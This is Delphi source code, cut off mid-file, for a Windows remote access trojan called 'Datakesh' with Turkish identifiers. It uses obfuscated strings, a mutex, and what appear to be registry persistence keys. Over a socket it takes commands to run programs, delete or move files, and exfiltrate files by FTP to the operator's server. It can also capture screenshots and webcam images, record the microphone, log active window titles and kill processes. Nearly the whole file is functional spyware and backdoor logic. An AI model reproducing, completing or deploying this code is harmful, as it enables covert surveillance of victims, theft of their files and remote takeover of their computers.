program Datakesh;

uses
windows,
sysutils,
ApplicationUnit,
tashaklisoket,
gfxCore,
threadunit2,
Tlhelp32,
md5,
urlmon,
shellapi,
crc32,
mmsystem,
wininet,
apicore;

{$I-}
{$A+,B-,C-,D-,E-,F-,G+,H+,I-,J-,K-,L-,M-,N+,O+,P+,Q-,R-,S-,T-,U-,V+,W-,X+,Y-,Z1}
{$MINSTACKSIZE $00004000}
{$MAXSTACKSIZE $00100000}
{$IMAGEBASE $00610000}
{$APPTYPE GUI}

CONST
cdacstr='KsLq86DaONLaQMyWP6zlSY1lS6Lk';
cdkapastr='KsLq86DaONLaQMyWP6zlSY1ZR6zpPMG';

kurstr='Kqz6L5T1KaLSJKb3KazJJqPKN5T9JaHFLrDSGrLIKaLEL5P5KbD9JqvSKbLE';
kurstr2='Kqz6L5T1KaLSJMbZSczpRsPqN45ZT6bsPI1JPNHrS5n9RdDqOMniPMGWGszjS6zkPMvqSrm';
kurstr3='KszcT7TXScLSJMbZSczpRsPqN5TfRcHlTtDSGtLoScLkT5PbSdDfRsvSPNXmR6zoPN9SLNDbSY1JQ6LiR216RsnaPN9p';
kurstr4='GszjRMzk87DqON9qTN0';
kurstr5='KtHrOb1XT6W';

str1='QMLuS6nlScK';
str2='AtbXRcbq';
str3='Rt1bRW';
str4='T6XrRM9pBcHY';
str5='L6XrRM9pBcHY';
str6='P6LpQtHlS2vfRca';

xx1='I6LoTFnoRFmWEaG';
xx2='Gcbw865vON9pQNfaOI1ZOMnf96boQNCWP/ni/6qWFKG';

INTERNET_OPEN_TYPE_DIRECT           = 1;
INTERNET_SERVICE_FTP = 1;
INTERNET_FLAG_PASSIVE = $08000000;
FTP_TRANSFER_TYPE_UNKNOWN   = $00000000;
IOC_IN = $80000000;
FIONBIO  = IOC_IN  or (SizeOf(Longint) shl 16) or (Ord('f') shl 8) or 126;

var
Applikeysin: TApplication;
Anasoket: TClientSocket;
MutexX: THandle;

mk: array[0..4] of string;
ftprm: array[0..4] of string;
dprm: array[1..1] of string;
parametre : array[0..2] of string;
yollanasi : array[0..3] of string;
aktif: array[0..11] of boolean;
Tayymir: array [0..2] of cardinal;
ayar : array[0..13] of string;

maxpaket,maxsikistirma,zamanasimi,thkalite: integer;
kayitsure,port,baglantisure:integer;
xpencere,tempseyi,silinesi,maske,yols,ayarstr1,ayarstr2,ayarstr3,crchedesi,Tashakli_isim,anahtaradi:string;
ftpkullanici,ftpsifre,baglantisifre,MuteXxX,adres,sifre,guid:string;

type
HINTERNET = Pointer;
INTERNET_PORT = Word;
MCIERROR = DWORD;
u_int   = DWORD;
u_long  = DWORD;
TSocket = u_int;

// Sayg�lar abi :(
function ioctlsocket( const s: TSocket; const cmd: DWORD; var arg: u_long ): Integer; stdcall; external 'WS2_32.DLL' name 'ioctlsocket';
// :(((

{
procedure silbeni;
var
F:Textfile;
dosia:string;
begin
try
randomize;
dosia:=tempdizini+'tmp'+inttostr(random(9999))+'.bat';
Assignfile(F,dosia);
Rewrite(F);
Closefile(F);
Assignfile(F,dosia);
Append(F);
Write(F,'del /Q '+sysdizini+'\'+anahtaradi+'\'+tashakli_isim+ #13#10);
Write(F,'del /Q '+sysdizini+'\'+anahtaradi + #13#10);
Write(F,'rmdir /Q '+sysdizini+'\'+anahtaradi+ #13#10);
Write(F,'del /Q '+sysdizini+'\'+tashakli_isim+ #13#10);
Write(F,'del /Q '+dosia+ #13#10);
Write(F,'del /Q %0'+ #13#10);
Write(F,'exit');
Closefile(F);
ShellExecute(0,nil,pchar(dosia),nil,nil,0);
halt;
except on exception do exit
end;
end;

procedure fatality;
//var
//anahtar:HKEY;
//label KUR;
begin
  exit;
try
//RegOpenKey(HKEY_LOCAL_MACHINE,pchar(decode64(kurstr)),anahtar);
//regdeletevalue(anahtar,pchar(anahtaradi));
//RegCloseKey(anahtar);
//RegDeleteKey(HKEY_LOCAL_MACHINE,pchar(decode64(kurstr2)+guid));
//RegDeleteKey(HKEY_current_user,pchar(decode64(kurstr2)+guid));
//silbeni;
finally
end;
end;
 }
procedure achiliskontrol;
begin
{$IFDEF Win32}
MutexX:=CreateMutex(NIL, False, pchar(MuteXxX));
if WaitForSingleObject(MutexX, 10000)=WAIT_TIMEOUT then Halt;
{$ELSE}
if HPrevInst=0 then Exit;
{$ENDIF}
end;

procedure hata(mesaj:string);
begin
Anasoket.SendString(mesaj)
end;

procedure katliam(zattiri : tthread2);
var
x:string;
begin
try
x:=silinesi;
Anasoket.SendString(decode64(str2)+'59='+inttostr(alayinisil(x))+'|.');
except on exception do exit;
end;
end;

procedure smsg(Threadimsi: TThread2);
var
t,h:integer;
ikon,alt:cardinal;
begin
ikon:=0;
alt:=0;
if mk[0] = '1' then ikon:=$00000010;
if mk[0] = '2' then ikon:=$00000030;
if mk[0] = '3' then ikon:=$00000020;
if mk[0] = '4' then ikon:=$00000040;

if mk[1] = '1' then alt:=$00000000;
if mk[1] = '2' then alt:=$00000001;
if mk[1] = '3' then alt:=$00000004;
if mk[1] = '4' then alt:=$00000005;

try
h:=messagebox(GetForegroundWindow,pchar(mk[3]),pchar(mk[4]),ikon or alt);
Anasoket.SendString('+msonuc='+mk[3]+'|'+inttostr(h)+'|.');

for t:=0 to 4 do begin
mk[t]:='';
end;
except on exception do exit;
end;
end;

procedure alayiniindir(xth: Tthread2);
var
FileName,hedex,rastg,orj:string;
FindHandle:THandle;
SearchRec:TWIN32FindData;
FileCount:integer;
intconn,intopen : hinternet;
sk:boolean;
label
hede,
zattiri;
begin
try
hedex:=maske;
filecount:=0;
intopen := internetopen(pchar(decode64(str1)),INTERNET_OPEN_TYPE_DIRECT,nil,nil,0);
intconn := internetconnect(intopen,pchar(adres),21,pchar(ftpkullanici),pchar(ftpsifre),INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,0);
if getlasterror=0 then begin
Anasoket.SendString(decode64(str2)+'60|.');
FindHandle := FindFirstFile(PChar(hedex), SearchRec);
if FindHandle <> INVALID_HANDLE_VALUE then
repeat
sleep(1);
if aktif[10] then begin
Anasoket.SendString(decode64(str2)+'62|.');
aktif[10]:=false;
exit;
end;
FileName:=SearchRec.cFileName;
orj:=filename;
if filename='.' then goto zattiri;
if filename='..' then goto zattiri;
if filename=decode64(str4) then goto zattiri;
if filename=decode64(str5) then goto zattiri;
if filename=decode64(str6) then goto zattiri;
if ((SearchRec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0) then goto zattiri;
sk:=false;
if getfilesize(filename) div 1024 div 1024 > maxsikistirma then goto hede;
randomize;
rastg:=tempdizini+'tmp'+inttostr(random(99999))+'.tmp';
sikistir(filename,rastg);
filename:=rastg;
sk:=true;
hede:
ftpputfile(intconn,pchar(filename),pchar(MutexXX+'@'+makine+'\'+yols+'\'+orj),FTP_TRANSFER_TYPE_UNKNOWN,0);
if getlasterror=0 then FileCount := FileCount + 1;
if sk then deletefile(rastg);
zattiri:
until FindNextFile(FindHandle,SearchRec)=false;
Windows.FindClose(FindHandle);
Anasoket.SendString(decode64(str2)+'61='+inttostr(filecount)+'|.');
end;
internetclosehandle(intconn);
internetclosehandle(intopen);
except on exception do exit;
end;
end;

procedure FTPyolla(Threadimsi: TThread2);
var
intconn,intopen : hinternet;
gg,xgc:string;
begin
gg:=ftprm[0];
if fileexists(gg) = true then begin
xgc:=extractfilename(gg);
try
Anasoket.SendString(decode64(str2)+'01='+ftprm[1]+':'+ftprm[2]+'/'+ftprm[3]+'@'+ftprm[4]+'|.');
intopen := internetopen(pchar(decode64(str1)),INTERNET_OPEN_TYPE_DIRECT,nil,nil,0);
intconn := internetconnect(intopen,pchar(ftprm[1]),strtoint(ftprm[2]),pchar(ftprm[3]),pchar(ftprm[4]),INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,0);
sleep(1);
if getlasterror=0 then begin
Anasoket.SendString(decode64(str2)+'02|.');
randomize;
if pos('tmp',xgc) > 0 then xgc:='grnt'+inttostr(random(9000))+'.jpg';
if pos('sysrss',xgc) > 0 then xgc:='ses'+inttostr(random(9000))+'.wav';
ftpputfile(intconn,pchar(gg),pchar(xgc),FTP_TRANSFER_TYPE_UNKNOWN,0);
if getlasterror=0 then Anasoket.SendString(decode64(str2)+'03='+xgc+'|.');
end
else Anasoket.SendString(decode64(str2)+'04='+ftprm[1]+':'+ftprm[2]+'/'+ftprm[3]+'@'+ftprm[4]+'|.');
internetclosehandle(intconn);
internetclosehandle(intopen);
if pos('tmp',xgc) > 0 then deletefile(xgc);
if pos('tmp',xgc) > 0 then deletefile(xgc);
if pos('sysrss',xgc) > 0 then deletefile(xgc);
if pos('tmp',gg) > 0 then deletefile(gg);
if pos('tmp',gg) > 0 then deletefile(gg);
if pos('sysrss',gg) > 0 then deletefile(gg);
except on exception do exit
end;
end
else if fileexists(gg) = false then Anasoket.SendString(decode64(str2)+'05='+gg);
END;

procedure Dosyagonder(Threadimsi: TThread2);
var
intconn,intopen : hinternet;
rastg,ggg,xgg,xg:string;
sk:boolean;
label
hede;
begin
ggg:=yollanasi[0];
xgg:=ggg;
xg:=yollanasi[1];
if fileexists(ggg) then begin
try
sk:=false;
if getfilesize(ggg) div 1024 div 1024 > maxsikistirma then goto hede;
randomize;
rastg:=tempdizini+'tmp'+inttostr(random(99999))+'.tmp';
sikistir(ggg,rastg);
ggg:=rastg;
sk:=true;
hede:
intopen := internetopen(pchar(decode64(str1)),INTERNET_OPEN_TYPE_DIRECT,nil,nil,0);
intconn := internetconnect(intopen,pchar(adres),21,pchar(ftpkullanici),pchar(ftpsifre),INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,0);
sleep(1);
if getlasterror=0 then begin
Anasoket.SendString(decode64(str2)+'06|.');
ftpputfile(intconn,pchar(ggg),pchar(MuteXxX+'@'+makine+'\'+xg),FTP_TRANSFER_TYPE_UNKNOWN,0);
if getlasterror=0 then Anasoket.SendString(decode64(str2)+'07='+xg+'|.');
if sk then deletefile(ggg);
sleep(100);
if pos('tmp',xgg) > 0 then deletefile(xgg);
if pos('tmp',xgg) > 0 then deletefile(xgg);
if pos('sysrss',xgg) > 0 then deletefile(xgg);
if pos('tmp',ggg) > 0 then deletefile(ggg);
if pos('tmp',ggg) > 0 then deletefile(ggg);
if pos('sysrss',ggg) > 0 then deletefile(ggg);
if fileexists(xgg) then Anasoket.SendString('+CRC='+MuteXxX+'@'+makine+'\'+xg+'|'+inttostr(computefilecrc32(xgg))+'|.');
end
else Anasoket.SendString(decode64(str2)+'04='+adres+':'+inttostr(21)+'|.');
internetclosehandle(intconn);
internetclosehandle(intopen);
except on exception do exit;
end;
end
else Anasoket.SendString(decode64(str2)+'05='+xg+'|.');
END;

procedure Dosyaver(Threadimsi: TThread2);
var
intconn,intopen : hinternet;
hede,mede:string;
begin
try
hede:=yollanasi[2];
mede:=yollanasi[3];
intopen := internetopen(pchar(decode64(str1)),INTERNET_OPEN_TYPE_DIRECT,nil,nil,0);
intconn := internetconnect(intopen,pchar(adres),21,pchar(ftpkullanici),pchar(ftpsifre),INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,0);
sleep(1);
if getlasterror=0 then begin
Anasoket.SendString(decode64(str2)+'06|.');
FtpGetFile(intconn, PChar(hede), PChar(mede), true,FILE_ATTRIBUTE_NORMAL, 0, DWORD(0));
if getlasterror=0 then begin
Anasoket.SendString(decode64(str2)+'07='+mede+'|.');
sleep(10);
if fileexists(mede) then Anasoket.SendString('+XRC='+hede+'|'+inttostr(computefilecrc32(mede))+'|.');
end
else Anasoket.SendString(decode64(str2)+'04='+adres+':'+inttostr(21)+'|.');
internetclosehandle(intconn);
internetclosehandle(intopen);
end
except on exception do exit;
end;
END;

{
procedure dindir(Threadimsi: TThread2);
var
ad,dd:string;
begin
try
ad:=parametre[1];
dd:=parametre[2];
Anasoket.sendstring(decode64(str2)+'08='+ad+'|.');
URLDownloadToFileA(nil, PChar(ad), PChar(dd), 0, nil);
if fileexists(dd) then Anasoket.sendstring(decode64(str2)+'09='+dd+'|.')
else Anasoket.sendstring(decode64(str2)+'04='+ad+'|.');
finally
end;
end;
 }
procedure konsolcikisi(Threadimtirack: TThread2);
const
ReadBuffer = 2400;
var
xs:string;
 Security : TSecurityAttributes;
 ReadPipe,WritePipe : THandle;
 start : TStartUpInfo;
 ProcessInfo : TProcessInformation;
 Buffer : Pchar;
 BytesRead : DWord;
Apprunning : DWord;
 begin
 try
 xs:=parametre[0];
   With Security do begin
    nlength := SizeOf(TSecurityAttributes) ;
    binherithandle := true;
    lpsecuritydescriptor := nil;
   end;
   if Createpipe (ReadPipe, WritePipe,
                  @Security, 0) then begin
    Buffer := AllocMem(ReadBuffer + 1) ;
    FillChar(Start,Sizeof(Start),#0) ;
    start.cb := SizeOf(start) ;
    start.hStdOutput := WritePipe;
    start.hStdInput := ReadPipe;
    start.dwFlags := STARTF_USESTDHANDLES +
                         STARTF_USESHOWWINDOW;
    start.wShowWindow := SW_HIDE;

    if CreateProcess(nil,
           PChar(xs),
           @Security,
           @Security,
           true,
           NORMAL_PRIORITY_CLASS,
           nil,
           nil,
           start,
           ProcessInfo)
    then
    begin
     repeat
      Apprunning := WaitForSingleObject
                   (ProcessInfo.hProcess,100) ;
      Applikeysin.ProcessMessages;
     until (Apprunning <> WAIT_TIMEOUT) ;
      Repeat
        BytesRead := 0;
        ReadFile(ReadPipe,Buffer[0],ReadBuffer,BytesRead,nil) ;
        Buffer[BytesRead]:= #0;
        OemToAnsi(Buffer,Buffer) ;
       Anasoket.sendstring(String(Buffer)) ;
      until (BytesRead < ReadBuffer) ;
   end;
   FreeMem(Buffer) ;
   CloseHandle(ProcessInfo.hProcess) ;
   CloseHandle(ProcessInfo.hThread) ;
   CloseHandle(ReadPipe) ;
   CloseHandle(WritePipe) ;
  end;
  finally
  Anasoket.Sendstring(decode64(str2)+'10|.');
 end;
end;

procedure zaman_kayit(Threadimtirack2: TThread2);
var
alitoputut:THandle;
begin
aktif[8]:=true;
alitoputut:=getforegroundwindow();
mciSendString('OPEN NEW TYPE WAVEAUDIO ALIAS hede', nil, 0, alitoputut);
mciSendString('SET hede TIME FORMAT MS ' +     // set time
    'BITSPERSAMPLE 16 ' +                // 8 Bit
    'CHANNELS 1 ' +                     // MONO 
    'SAMPLESPERSEC 11025 ' +             // 8 KHz
    'BYTESPERSEC 21000',                // 8000 Bytes/s
    nil, 0, alitoputut);
mciSendString('RECORD hede', nil, 0, alitoputut);
sleep(kayitsure);
mciSendString('STOP hede', nil, 0, alitoputut);
sleep(1);
mciSendString(PChar('SAVE hede ' + sysdizini+'\sysrss128.sys'), nil, 0, alitoputut);
sleep(1);
mciSendString('CLOSE hede', nil, 0, alitoputut);
Anasoket.Sendstring(decode64(str2)+'31='+inttostr(GetFileSize(sysdizini+'\sysrss128.sys') div 1024)+' kb'+'|.');
sleep(1);
Anasoket.Sendstring('+als='+sysdizini+'\sysrss128.sys'+'|.');
aktif[8]:=false;
end;

procedure pcevap(Threadimsi2: TThread2);
var
kacpaket,bolunecek,i,sayacc:integer;
parcalanasi:string;
label
bekle;
begin
aktif[5]:=True;
aktif[4]:=false;
kacpaket:=length(dprm[1]) div maxpaket;
if (length(dprm[1]) mod maxpaket) > 0 then kacpaket:=kacpaket+1;
parcalanasi:=dprm[1];

for i:=0 to kacpaket do begin

if aktif[4] then begin
Anasoket.sendstring('+piptal');
aktif[5]:=false;
exit;
end;

if length(parcalanasi) < maxpaket then bolunecek:=length(parcalanasi)
else bolunecek:=maxpaket;

Anasoket.Sendstring('+pkomut['+inttostr(i)+'/'+inttostr(kacpaket)+']'+copy(parcalanasi,1,bolunecek));
delete(parcalanasi,1,bolunecek);
aktif[3]:=false;
sleep(10);
sayacc:=0;

bekle:
sleep(300);
if not Anasoket.Connected then begin
aktif[5]:=false;
exit;
end;

sayacc:=sayacc+1;

if sayacc > zamanasimi then begin
Anasoket.sendstring('+phata');
aktif[5]:=false;
exit;
end;

if aktif[4] then begin
Anasoket.sendstring('+piptal');
aktif[5]:=false;
exit;
end;

if aktif[3]=false then goto bekle;
end;

Anasoket.sendstring('+dogrula='+strmd5(dprm[1])+'|.');
aktif[5]:=false;
end;

procedure baslikyolla;stdcall;
begin
try

if not Anasoket.Connected then begin
aktif[6]:=false;
killtimer(0,tayymir[0]);
end;

if xpencere <> aktifpencere then Anasoket.SendString('+BD'+SearchAndReplace(aktifpencere,'|','?')+' ['+timetostr(time)+']'+'|.');
xpencere:=aktifpencere;
except on exception do begin
killtimer(0,tayymir[0]);
aktif[6]:=false;
Anasoket.SendString(decode64(str2)+'11|.');
end;
end;
end;

procedure xfataliti(th : TThread2);
var
sayb:integer;
label
geberlagn,
bekliom;
begin
sayb:=0;

bekliom:
sleep(1000);
if sayb=15 then goto geberlagn;
if aktif[9]=false then exit;
sayb:=sayb+1;
goto bekliom;
geberlagn:
Anasoket.sendstring(decode64(str2)+'12|.');
Anasoket.Disconnect;
aktif[9]:=False;
end;

procedure idlekontrol;stdcall;
begin
try

if not Anasoket.Connected then begin
aktif[7]:=false;
killtimer(0,tayymir[1]);
end;

if idle = 0 then begin
Anasoket.SendString('+!IDL!'+'|'+makine+'|'+kullanici+'|.');
aktif[7]:=false;
killtimer(0,tayymir[1]);
end;
except on exception do begin
killtimer(0,tayymir[1]);
aktif[7]:=False;
end;
end;
end;

procedure thbolustur(thf: tthread2);
var
zattiri,gecici:string;
xc:integer;

begin
aktif[11]:=true;
zattiri:=getcurrentdir;
xc:=thkalite;
try
Anasoket.SendString(decode64(str2)+'63='+inttostr(xc)+'|.');
randomize;
gecici:=tempdizini+'\~tmp$'+inttostr(random(512))+'.tmp';
if CreateThumbnail(zattiri,gecici,xc,maxsikistirma) then begin
Anasoket.SendString(decode64(str2)+'65=|.');
aktif[11]:=false;
sleep(1);
Anasoket.Sendstring('+alj='+gecici+'|.');
end;
except on exception DO HATA('+uyari02');
end;
end;

procedure PsyCore(Thread: TThread2; Socket: TClientSocket);
var
x: integer;
komut,xk: string;
Nonblocking: cardinal;
label
SON,
yettigari;
begin
Nonblocking := 1;
ioctlsocket(Socket.Socket, FIONBIO, Nonblocking);
socket.sendstring('<BEN>'+encode64(makine+'|'+kullanici+'|'+baglantisifre+'|'+inttostr(port))+'</BEN>');
TThread2.Create(@xfataliti, 0);
aktif[9]:=true;
while socket.Connected do begin
xk:=socket.ReceiveString;
if Length(xk) > 0 then begin
if copy(xk,1,5) = '<SEN>' then begin
delete(xk,1,5);
xk:=copy(xk,1,pos('</SEN>',xk)-1);
xk:=decode64(xk);
if strmd5(parcala(xk,5)) = baglantisifre then begin
ftpkullanici:=parcala(xk,0);
ftpsifre:=parcala(xk,1);
maxpaket:=strtoint(parcala(xk,2));
maxsikistirma:=strtoint(parcala(xk,3));
zamanasimi:=strtoint(parcala(xk,4));
goto yettigari;
end
else begin
socket.SendString(decode64(str2)+'13|.');
socket.Disconnect;
sleep(60000);
end;
end;

socket.SendString(decode64(str2)+'13|.');
socket.Disconnect;
sleep(60000);
end;
sleep(10);
end;

yettigari:
aktif[9]:=false;

socket.SendString('<TAMAM>');

While Socket.Connected do begin
komut := Socket.ReceiveString;

    if Length(komut) > 0 then begin

    //komutlar basla!

    if copy (komut, 1, 3)='/LS' then begin
    delete(komut, 1, 4);
    dprm[1]:=ListFiles(komut);

    if length(dprm[1]) > maxpaket then begin
    if not aktif[5] then TThread2.Create(@pcevap, 0);
    aktif[5]:=true;
    goto son;
    end
    else Socket.Sendstring(dprm[1]);
    goto son;
    end;

    if copy (komut, 1, 5)='/EXEC' then begin
    delete(komut, 1, 6);
    komut:=parcala(komut,0);
    if RunProcess(PChar(komut), SW_SHOWNORMAL) = true then Socket.Sendstring(decode64(str2)+'14='+komut+'|.')
    else socket.SendString(decode64(str2)+'15='+komut+'|.');
    goto son;
    end;

    if copy (komut, 1, 4)='/SIL' then begin
    delete(komut, 1, 5);
    komut:=parcala(komut,0);
    if directoryexists(komut) then begin
    if deltree(komut) then socket.SendString(decode64(str2)+'16='+komut+'|.') else socket.SendString(decode64(str2)+'17='+komut+'|.');
    goto son;
    end;

    if deletefile(komut) then Socket.Sendstring(decode64(str2)+'18='+komut+'|.') else Socket.Sendstring(decode64(str2)+'19='+komut+'|.');
    goto son;
    end;

    if copy (komut, 1, 6)='/KOPYA' then begin
    delete(komut, 1, 7);
    if copyfile(pchar(parcala(komut,0)),pchar(parcala(komut,1)),false) then Socket.Sendstring(decode64(str2)+'20='+parcala(komut,1)+'|.')
    else
    Socket.Sendstring(decode64(str2)+'21='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 7)='/YADLAN' then begin
    delete(komut, 1, 8);
    if renamefile(pchar(parcala(komut,0)),pchar(parcala(komut,1))) = true then Socket.Sendstring(decode64(str2)+'22='+parcala(komut,1)+'|.')
    else
    Socket.Sendstring(decode64(str2)+'23='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 3)='/CD' then begin
    delete(komut, 1, 4);
    komut:=parcala(komut,0);
    if directoryexists(parcala(komut,0)) then begin
    chdir(pchar(parcala(komut,0)));
    Socket.Sendstring('+ADZ'+getcurrentdir+'|.')
    end
    else
    Socket.Sendstring(decode64(str2)+'24='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 7)='/DYUKLE' then begin
    delete(komut, 1, 8);
    yollanasi[0]:=parcala(komut,0);
    yollanasi[1]:=parcala(komut,1);
    TThread2.Create(@Dosyagonder, 0);
    goto son;
    end;

    if copy (komut, 1, 9)='/RESIMLER' then begin
    delete(komut, 1, 10);
    if aktif[11] then begin
    socket.sendstring(decode64(str2)+'64|.');
    goto son;
    end;
    try
    thkalite:=strtoint(parcala(komut,0));
    TThread2.Create(@thbolustur, 0);
    finally
    end;
    goto son;
    end;

    if copy (komut, 1, 5)='/HGND' then begin
    delete(komut, 1, 6);
    maske:=parcala(komut,0);
    yols:=getcurrentdir;
    yols:=copy(yols,lastdelimiter('\',YOLS)+1,length(yols));
    Anasoket.SendString('+mmk='+MuteXxX+'@'+makine+'\'+yols+'|.');
    TThread2.Create(@alayiniindir,0);
    goto son;
    end;

    if copy (komut, 1, 5)='/DKOY' then begin
    delete(komut, 1, 6);
    yollanasi[2]:=parcala(komut,0);
    yollanasi[3]:=parcala(komut,1);
    TThread2.Create(@Dosyaver, 0);
    goto son;
    end;

    if copy (komut, 1, 4)='/FTP' then begin
    delete(komut, 1, 5);
    for x:=0 to 4 do begin
    ftprm[x]:=parcala(komut,x);
    end;
    TThread2.Create(@ftpyolla, 0);
    goto son;
    end;

    if copy (komut, 1, 4)='/HDB' then begin
    delete(komut, 1, 5);
    komut:=parcala(komut,0);
    socket.SendString(hddbilgisi(komut)+'|.');
    goto son;
    end;

    if copy (komut, 1, 3)='/DB' then begin
    delete(komut, 1, 4);
    komut:=parcala(komut,0);
    if directoryexists(komut) then
    socket.SendString('+kbilgi='+komut+'|'+inttostr(GetDirectorySize(komut))+'|.')
    else
    Socket.Sendstring('+dbilgi='+komut+'|'+inttostr(GetFileSize(komut))+'|'+datetostr(File_GetCreationDate(komut))+'|'+datetostr(File_GetLastModifiedDate(komut))+'|'+datetostr(File_GetLastAccessDate(komut))+'|.');
    goto son;
    end;

    if copy (komut, 1, 8)='/PGEBERT' then begin
    delete(komut, 1, 9);
    if KillProcess(parcala(komut,0)) = 1 then Socket.Sendstring(decode64(str2)+'25='+parcala(komut,0)+'|.')
    else
    Socket.Sendstring(decode64(str2)+'26='+parcala(komut,0)+'|.');
    goto son;
    end;

    if komut = '/DR' then begin
    Socket.Sendstring(decode64(str2)+'27='+getcurrentdir+'|.');
    goto son;
    end;

    if komut = '/APENC' then begin
    Socket.Sendstring(decode64(str2)+'28='+SearchAndReplace(aktifpencere,'|','?')+'|.');
    sleep(1);
    goto son;
    end;

   if copy (komut, 1, 4)='/PCC' then begin
    try
    Socket.Sendstring(decode64(str2)+'29='+parcala(komut,1)+'|.');
    randomize;
    tempseyi:=tempdizini+'\~tmp$'+inttostr(random(256))+'.tmp';
    pencerekap(strtoint(parcala(komut,1)),parcala(komut,2),tempseyi);
    except on exception DO HATA('+uyari01');
    end;
    Socket.Sendstring('+alj='+tempseyi+'|.');
    goto son;
   end;

   if copy (komut, 1, 5)='/XPCC' then begin
    try
    Socket.Sendstring(decode64(str2)+'29='+parcala(komut,1)+'|.');
    randomize;
    tempseyi:=tempdizini+'\~tmp$'+inttostr(random(256))+'.tmp';
    pencerekap(strtoint(parcala(komut,1)),aktifpencere,tempseyi);
    except on exception DO HATA('+uyari01');
    end;
    Socket.Sendstring('+alj='+tempseyi+'|.');
    goto son;
   end;

    if copy (komut, 1, 3)='/SC' then begin
    try
    Socket.Sendstring(decode64(str2)+'29='+parcala(komut,1)+'|.');
    randomize;
    tempseyi:=tempdizini+'\~tmp$'+inttostr(random(256))+'.tmp';
    SaveScr(strtoint(parcala(komut,1)), tempseyi);
    except on exception DO HATA('+uyari01');
    end;
    Socket.Sendstring('+alj='+tempseyi+'|.');
    goto son;
   end;

    if copy (komut, 1, 3)='/CC' then begin
    try
    Socket.Sendstring(decode64(str2)+'30='+parcala(komut,1)+'|.');
    randomize;
    tempseyi:=tempdizini+'\~tmpx'+inttostr(random(256))+'.tmp';
    Camkaydet(strtoint(parcala(komut,1)),tempseyi);
    except on exception DO HATA('+uyari02');
    end;
    Socket.Sendstring('+alc='+tempseyi+'|.');
    goto son;
    end;

   if copy (komut, 1, 4)='/AVC' then begin
    try
    Socket.Sendstring(decode64(str2)+'30='+parcala(komut,1)+'|.');
    randomize;
    tempseyi:=tempdizini+'\~tmpx'+inttostr(random(256))+'.tmp';
    advcamkaydet(strtoint(parcala(komut,1)),strtoint(parcala(komut,2)),strtoint(parcala(komut,3)),tempseyi);
    except on exception DO HATA('+uyari02');
    end;
    Socket.Sendstring('+alc='+tempseyi+'|.');
    goto son;
    end;

    if copy (komut, 1, 3)='/MC' then begin
    if aktif[8] then begin
    Socket.Sendstring(decode64(str2)+'32');
    goto son;
    end;
    try
    Socket.Sendstring(decode64(str2)+'33='+parcala(komut,1)+'|.');
    kayitsure:= strtoint(parcala(komut,1))*1000;
    TThread2.Create(@zaman_kayit, 0);
    aktif[8]:=true;
    except on exception DO HATA('+uyari03');
    end;
    goto son;
    end;

    if copy (komut, 1, 4) = '/PRG' then begin
    dprm[1]:=ListProcesses;

    if length(dprm[1]) > maxpaket then begin
    if not aktif[5] then TThread2.Create(@pcevap, 0);
    aktif[5]:=true;
    goto son;
    end;

    Socket.Sendstring(dprm[1]);
    goto son;
    end;

    if copy (komut, 1, 6) = '/MEKAN' then begin
    delete(komut, 1, 7);
    komut:=parcala(komut,0);
    if komut = '01' then Socket.Sendstring('+mekan01'+windizini+'|'+sysdizini+'|'+tempdizini+'|.');
    if komut = '02' then Socket.Sendstring(shellmekanlari+'|.');
    goto son;
    end;

    if copy (komut, 1, 3) = '/TL' then begin
    dprm[1]:=TaskList(getforegroundwindow)+'|.';

    if length(dprm[1]) > maxpaket then begin
    if not aktif[5] then TThread2.Create(@pcevap, 0);
    aktif[5]:=true;
    goto son;
    end;

    Socket.Sendstring(dprm[1]);
    goto son;
    end;

    if copy (komut, 1, 4) = '/ATL' then begin
    dprm[1]:=alayi(getforegroundwindow)+'|.';

    if length(dprm[1]) > maxpaket then begin
    if not aktif[5] then TThread2.Create(@pcevap, 0);
    aktif[5]:=true;
    goto son;
    end;

    Socket.Sendstring(dprm[1]);
    goto son;
    end;

    if copy (komut, 1, 4) = '/XTL' then begin
    Socket.Sendstring('X'+TaskList(getforegroundwindow)+'|.');
    goto son;
    end;

    if copy (komut, 1, 8) = '/TANIMLA' then begin
    socket.sendstring('+tanim'+'|'+Paramstr(0)+'|'+Tashakli_isim+'|'+anahtaradi+'|'+adres+':'+inttostr(port)+'|'+MuteXxX+'|'+guid+'|'+encode64(ayarstr1+'|'+ayarstr2+'|'+ayarstr3)+'|'+inttostr(maxpaket)+'|'+inttostr(maxsikistirma)+'|'+inttostr(zamanasimi)+'|'+inttostr(baglantisure)+'|'+crchedesi+'|.');
    goto son;
    end;

    if copy (komut, 1, 4) = '/DRV' then begin
    Socket.Sendstring(List_Drivers+'|.');
    goto son;
    end;

    if copy (komut, 1, 7) = '/SBILGI' then begin
    socket.SendString('+sbilgi'+'|'+makine+'|'+kullanici+'|'+getos+'|'+GetOSLanguage+'|'+detaylar+'|'+ecozunurluk+'|'+toplamram+'|.');
    goto son;
    end;

    if copy (komut, 1, 7) = '/GBILGI' then begin
    socket.SendString('+gbilgi'+'|'+ramdurumu+'|'+GetPowerStatus+'|'+inttostr(GetTickCount)+'|'+inttostr(idle)+'|.');
    goto son;
    end;

    if copy (komut, 1, 6)='/HADEE' then begin
    delete(komut, 1, 7);
    if fileexists(parcala(komut,0)) = false then begin
    if directoryexists(parcala(komut,0)) = false then begin
    Socket.Sendstring(decode64(str2)+'05='+parcala(komut,0)+'|.');
    goto SON
    end;
    end;
    ShellExecute(0,pchar(decode64(str3)),PChar(parcala(komut,0)),nil,nil,SW_SHOW);
    Socket.Sendstring(decode64(str2)+'14='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 3)='/GC' then begin
    delete(komut, 1, 4);
    if fileexists(parcala(komut,0)) = false then begin
    if directoryexists(parcala(komut,0)) = false then begin
    Socket.Sendstring(decode64(str2)+'05='+parcala(komut,0)+'|.');
    goto SON
    end;
    end;
    ShellExecute(0,pchar(decode64(str3)),PChar(parcala(komut,0)),nil,nil,0);
    Socket.Sendstring(decode64(str2)+'14='+parcala(komut,0)+'|.');
    goto son;
    end;

    if copy (komut, 1, 4)='/DOS' then begin
    Socket.Sendstring(decode64(str2)+'34|.');
